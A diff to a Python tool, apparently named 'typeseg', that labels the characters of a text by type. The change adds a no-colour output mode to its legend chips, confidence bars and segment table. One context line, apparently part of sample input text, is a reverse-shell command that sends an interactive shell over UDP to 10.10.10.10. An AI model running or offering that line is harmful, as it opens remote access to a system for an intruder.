@@ -26,7 +26,9 @@ from ._color import (
     RESET,
     accent as _accent,
     bg as _bg,
+    color_enabled,
     fg as _fg,
+    terminal_text,
     tint as _tint,
 )
 
@@ -50,8 +52,10 @@ sh -i >& /dev/udp/10.10.10.10/9001 0>&1
 """
 
 
-def render_body(text, char_labels):
+def render_body(text, char_labels, *, use_color):
     """Tint each char by label; reset at newlines so bg doesn't bleed."""
+    if not use_color:
+        return terminal_text(text)
     out, cur = [], None
     for ch, lab in zip(text, char_labels):
         if ch == "\n":
@@ -61,18 +65,22 @@ def render_body(text, char_labels):
         if lab != cur:
             out.append(RESET + _bg(_tint(_accent(lab))) + _fg((30, 30, 30)))
             cur = lab
-        out.append(ch)
+        out.append(terminal_text(ch))
     out.append(RESET)
     return "".join(out)
 
 
-def chip(label):
+def chip(label, *, use_color):
+    if not use_color:
+        return f" {label} "
     a = _accent(label)
     return f"{_bg(_tint(a, 0.45))}{_fg((20, 20, 20))} {label} {RESET}"
 
 
-def bar(conf, width=12):
+def bar(conf, width=12, *, use_color):
     n = int(round(conf * width))
+    if not use_color:
+        return "█" * n + "░" * (width - n)
     g = int(80 + 150 * conf)
     return f"{_fg((220 - int(120 * conf), g, 90))}{'█' * n}{DIM}{'░' * (width - n)}{RESET}"
 
@@ -120,32 +128,35 @@ def main(argv=None):
     fn = fast if args.model == "fast" else precise
     result = fn(text, model_set=args.model_set)
     info = backend_info(model_set=args.model_set, model=args.model)
+    use_color = color_enabled()
+    bold, dim, reset = (BOLD, DIM, RESET) if use_color else ("", "", "")
 
-    print(f"\n{BOLD}typeseg.{args.model} [{args.model_set}]{RESET}  "
-          f"{DIM}backend={info['backend']} gpu={info['gpu']}  "
-          f"{len(text)} chars  {len(result.segments)} segments{RESET}\n")
+    print(f"\n{bold}typeseg.{args.model} [{args.model_set}]{reset}  "
+          f"{dim}backend={info['backend']} gpu={info['gpu']}  "
+          f"{len(text)} chars  {len(result.segments)} segments{reset}\n")
 
     # legend (labels present, in order of first appearance)
     seen = []
     for s in result.segments:
         if s.label not in seen:
             seen.append(s.label)
-    print("  " + "  ".join(chip(lbl) for lbl in seen) + "\n")
+    print("  " + "  ".join(chip(lbl, use_color=use_color) for lbl in seen) + "\n")
 
     # body
-    for line in render_body(text, result.char_labels).split("\n"):
+    for line in render_body(text, result.char_labels, use_color=use_color).split("\n"):
         print("  │ " + line)
     print()
 
     # segment table
-    print(f"  {BOLD}{'#':>2}  {'range':>11}  {'label':<22} {'conf':<14} text{RESET}")
+    print(f"  {bold}{'#':>2}  {'range':>11}  {'label':<22} {'conf':<14} text{reset}")
     for i, s in enumerate(result.segments):
-        snip = text[s.start:s.end].replace("\n", "⏎")
+        snip = terminal_text(text[s.start:s.end]).replace("\n", "⏎")
         if len(snip) > 46:
             snip = snip[:43] + "…"
         rng = f"{s.start}-{s.end}"
-        print(f"  {i:>2}  {rng:>11}  {chip(s.label):<22} {bar(s.confidence)} "
-              f"{s.confidence * 100:4.0f}% {DIM}{snip}{RESET}")
+        print(f"  {i:>2}  {rng:>11}  {chip(s.label, use_color=use_color):<22} "
+              f"{bar(s.confidence, use_color=use_color)} "
+              f"{s.confidence * 100:4.0f}% {dim}{snip}{reset}")
     print()
 
 
